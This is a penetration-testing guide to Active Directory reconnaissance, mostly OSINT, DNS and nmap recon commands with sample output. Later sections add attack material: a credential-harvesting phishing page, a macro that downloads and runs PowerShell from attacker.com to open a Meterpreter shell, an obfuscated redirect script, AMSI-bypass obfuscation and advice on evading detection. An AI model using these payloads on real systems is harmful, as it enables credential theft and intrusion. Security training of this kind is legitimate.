# Reconnaissance in Active Directory Penetration Testing

## Overview
Reconnaissance is the initial phase of AD penetration testing, focusing on gathering information about the target environment without direct interaction (passive) or with minimal interaction (active, if permitted). The goal is to identify domain names, network infrastructure, user details, and potential entry points for subsequent attacks.

## Detailed Methods and Techniques
- **Passive Reconnaissance**:
  - **OSINT (Open-Source Intelligence)**:
    - **Technique**: Collect publicly available data from websites, social media (e.g., LinkedIn, Twitter), job boards, and public records to identify domain names, employee roles, and organizational structure.
    - **Execution**: Use `theHarvester` to gather emails, subdomains, and hosts from search engines and platforms.
      ```bash
      theHarvester -d example.com -b google,linkedin,shodan -f recon_output.html
      ```
      **Example Output**:
      ```
      [+] Emails found:
      john.doe@example.com
      jane.smith@example.com
      [+] Hosts found:
      dc01.example.com
      mail.example.com
      [+] LinkedIn profiles:
      John Doe - IT Administrator
      Jane Smith - System Analyst
      ```
    - **Purpose**: Identify targets for phishing and subdomains that may point to AD infrastructure (e.g., domain controllers).
  - **WHOIS Lookups**:
    - **Technique**: Query domain registration details to uncover ownership, registrars, and name servers.
    - **Execution**: Use `whois` or online services like `whois.domaintools.com`.
      ```bash
      whois example.com
      ```
      **Example Output**:
      ```
      Domain Name: EXAMPLE.COM
      Registrar: GoDaddy.com, LLC
      Registrant Organization: Example Corp
      Registrant Email: admin@example.com
      Name Server: ns1.example.com
      ```
    - **Purpose**: Discover administrative contacts and DNS infrastructure linked to AD.
  - **DNS Enumeration**:
    - **Technique**: Identify subdomains, MX, TXT, and SRV records to map AD-related hosts (e.g., `_ldap._tcp.dc._msdcs.example.com` for domain controllers).
    - **Execution**: Use `dnsrecon` or `fierce` for DNS enumeration.
      ```bash
      dnsrecon -d example.com -t std
      ```
      **Example Output**:
      ```
      [+] A dc01.example.com 192.168.1.10
      [+] A mail.example.com 192.168.1.20
      [+] SRV _ldap._tcp.dc._msdcs.example.com dc01.example.com 389
      [+] TXT v=spf1 include:_spf.google.com ~all
      ```
    - **Purpose**: Locate domain controllers and other critical AD infrastructure.
  - **Certificate Transparency Logs**:
    - **Technique**: Query certificate transparency logs to discover subdomains with issued SSL certificates.
    - **Execution**: Use `crt.sh` or `censys`.
      ```bash
      curl -s "https://crt.sh/?q=%.example.com&output=json" | jq .
      ```
      **Example Output**:
      ```
      [{"name_value":"dc01.example.com"},{"name_value":"owa.example.com"}]
      ```
    - **Purpose**: Identify hidden subdomains exposing AD services.
  - **Breach Data Analysis**:
    - **Technique**: Search breach databases (e.g., Have I Been Pwned) for leaked credentials or domains.
    - **Execution**: Use `haveibeenpwned` API or manual searches.
      ```bash
      curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/john.doe@example.com"
      ```
      **Example Output**:
      ```
      [{"Name":"DataBreach2023","Domain":"example.com"}]
      ```
    - **Purpose**: Identify previously compromised credentials for phishing or password spraying.
- **Active Reconnaissance** (if permitted):
  - **Network Scanning**:
    - **Technique**: Identify live hosts and open ports (e.g., SMB on 445, RDP on 3389, LDAP on 389) using non-intrusive scans.
    - **Execution**: Use `nmap` for host discovery and service enumeration.
      ```bash
      nmap -sP 192.168.1.0/24
      nmap -sV -p 445,3389,389 192.168.1.10
      ```
      **Example Output**:
      ```
      Nmap scan report for 192.168.1.10
      Host is up (0.002s latency).
      PORT    STATE  SERVICE      VERSION
      389/tcp open   ldap         Microsoft Windows Active Directory LDAP
      445/tcp open   microsoft-ds Microsoft Windows Server 2019 SMB
      3389/tcp open  ms-wbt-server Microsoft RDP 10.0
      ```
    - **Purpose**: Confirm AD-related services on potential domain controllers.
  - **Banner Grabbing**:
    - **Technique**: Collect service banners to identify software versions and vulnerabilities.
    - **Execution**: Use `netcat` or `telnet`.
      ```bash
      nc -v 192.168.1.10 445
      ```
      **Example Output**:
      ```
      Connection to 192.168.1.10 445 port [tcp/microsoft-ds] succeeded!
      SMBv2.1 dialect
      ```
    - **Purpose**: Identify outdated services (e.g., SMBv1) for exploitation.

## Exploitation Methods
- **Phishing Setup**:
  - **Technique**: Craft targeted phishing emails using OSINT data to harvest credentials.
  - **Execution**: Use `SET` to create a fake AD login page.
    ```bash
    setoolkit
    # Select: 1) Social-Engineering Attacks
    # Select: 2) Website Attack Vectors
    # Select: 3) Credential Harvester Attack
    # Clone: https://owa.example.com
    ```
    **Example Output**:
    ```
    [+] Credential captured:
    Username: john.doe@example.com
    Password: P@ssw0rd123
    ```
    - **Purpose**: Obtain valid AD credentials for further attacks.
  - **Technique**: Spear-phishing with malicious attachments (e.g., macro-enabled documents).
    - **Execution**: Create a VBA macro to execute a PowerShell payload.
      ```vba
      Sub AutoOpen()
          Shell "powershell -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1'))"
      End Sub
      ```
      **Example Output**: Establishes a Meterpreter session.
      ```
      [*] Meterpreter session 1 opened
      ```
    - **Purpose**: Gain a shell on the victim’s system.
- **Subdomain Takeover**:
  - **Technique**: Exploit dangling DNS records (e.g., unclaimed CNAMEs pointing to cloud services like AWS S3 or Azure).
  - **Execution**: Use `dnsrecon` to find subdomains, then verify unclaimed resources.
    ```bash
    dnsrecon -d example.com -t axfr
    ```
    **Example Output**:
    ```
    [+] CNAME test.example.com s3.bucket.amazonaws.com
    ```
    - Register the unclaimed S3 bucket to control `test.example.com`.
    - **Purpose**: Host malicious content on a trusted subdomain for phishing or malware delivery.

## AV/AMSI Evasion Techniques
- **Obfuscated Phishing Payloads**:
  - **Technique**: Use encoded or obfuscated JavaScript/HTML in phishing pages to evade AV detection.
  - **Execution**: Create a phishing page with Base64-encoded JavaScript.
    ```html
    <script>eval(atob('ZG9jdW1lbnQubG9jYXRpb24gPSAnaHR0cDovL2F0dGFja2VyLmNvbS9sb2dpbi5waHA='));</script>
    ```
    - **Purpose**: Redirect users to a malicious page without triggering AV.
- **Proxy Usage**:
  - **Technique**: Route reconnaissance traffic through proxies or Tor to avoid detection by network-based AV/EDR systems.
  - **Execution**: Use `proxychains` with `nmap`.
    ```bash
    proxychains nmap -sP 192.168.1.0/24
    ```
    - **Purpose**: Mask the source of active scans to evade network monitoring.
- **AMSI Bypass for Payloads**:
  - **Technique**: Obfuscate PowerShell payloads in phishing emails to bypass AMSI.
  - **Execution**: Use `Invoke-Obfuscation` to encode payloads.
    ```powershell
    Invoke-Obfuscation -ScriptBlock {IEX((New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1'))} -Technique Encode
    ```
    **Example Output**:
    ```
    $encoded = "JAB...=="
    Invoke-Expression ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($encoded)))
    ```
    - **Purpose**: Prevent AMSI from detecting malicious PowerShell scripts.

## Tools
- **theHarvester**: OSINT for emails and subdomains (`theHarvester -d example.com -b all`).
- **dnsrecon**: DNS enumeration (`dnsrecon -d example.com -t std`).
- **whois**: Domain registration lookup (`whois example.com`).
- **Nmap**: Network scanning (`nmap -sV -p- <target>`).
- **Recon-ng**: OSINT framework (`recon/domains-hosts/hackertarget`).
- **Maltego**: Visualizes relationships between entities.
- **Censys/crt.sh**: Certificate transparency log queries.
- **SET**: Social engineering toolkit for phishing.

## Best Practices
- Avoid active scanning unless explicitly authorized to prevent detection or disruption.
- Document all findings (domains, IPs, emails) in a structured format.
- Use proxies or VPNs to anonymize reconnaissance activities.
- Verify legal boundaries when collecting personal data via OSINT.